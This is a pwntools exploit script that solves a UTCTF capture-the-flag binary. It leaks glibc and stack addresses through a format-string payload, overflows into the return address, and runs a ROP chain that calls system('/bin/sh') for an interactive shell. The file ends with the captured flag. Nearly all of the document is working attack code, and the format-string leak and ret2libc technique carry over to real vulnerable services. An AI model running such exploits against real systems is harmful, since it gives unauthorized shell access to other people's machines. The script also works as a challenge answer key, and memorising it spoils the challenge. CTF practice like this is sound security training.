from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs='''
b *main+33
b *main+270
continue
'''

p = gdb.debug('./shellcode_patched', env=environ, gdbscript=gs)

# p = remote('challenge.utctf.live', 9009)

# def transform_payload(payload):
#     '''
#     This function reverses the binary's transformation algorithm:
#     - If transformed character would be alphabetic, reverse with: char = -0x65 - char
#     - If transformed character would be digit, reverse with: char = -0x25 - char
#     - Otherwise, character remains unchanged
#     '''
#     result = bytearray()
#     for byte in payload:
#         # Check if the byte is an alphabet character (a-z or A-Z)
#         if (ord('a') <= byte <= ord('z')) or (ord('A') <= byte <= ord('Z')):
#             # Calculate the symmetrical letter
#             if ord('a') <= byte <= ord('z'):
#                 # For lowercase: a->z, b->y, c->x, etc.
#                 symmetrical = ord('z') - (byte - ord('a'))
#             else:
#                 # For uppercase: A->Z, B->Y, C->X, etc.
#                 symmetrical = ord('Z') - (byte - ord('A'))
#             result.append(symmetrical)
#         else:
#             # Keep non-alphabet bytes unchanged
#             result.append(byte)
    
#     return bytes(result)

p.recvuntil(b'<Insert prompt here>: \n')
p.sendline(b'%3$p%23$p'+b'\0'*(0x30-9)+p64(0x601051)+b'\0'*0x10+p64(0x400616))

leaks = p.recv(28).strip().decode()
print(leaks)
glibc_base_addr = int(leaks[0:14], 16)-0x3c48e0
log.info(f'glibc base addr: {hex(glibc_base_addr)}')
stack_addr = int(leaks[14:28], 16)
log.info(f'stack addr: {hex(stack_addr)}')

glibc_r = ROP('./libc.so.6')
glibc_e = ELF('./libc.so.6')
chain = [
    glibc_r.rdi.address + glibc_base_addr,
    next(glibc_e.search(b"/bin/sh")) + glibc_base_addr,
    glibc_r.ret.address + glibc_base_addr,
    glibc_e.symbols.system + glibc_base_addr
]

p.recvuntil(b'<Insert prompt here>: \n')
p.sendline(b'\0'*0x30+p64(0x601051)+b'\0'*0x10+b''.join([p64(c) for c in chain]))

p.interactive()

# utflag{i_should_be_doing_ccdc_rn}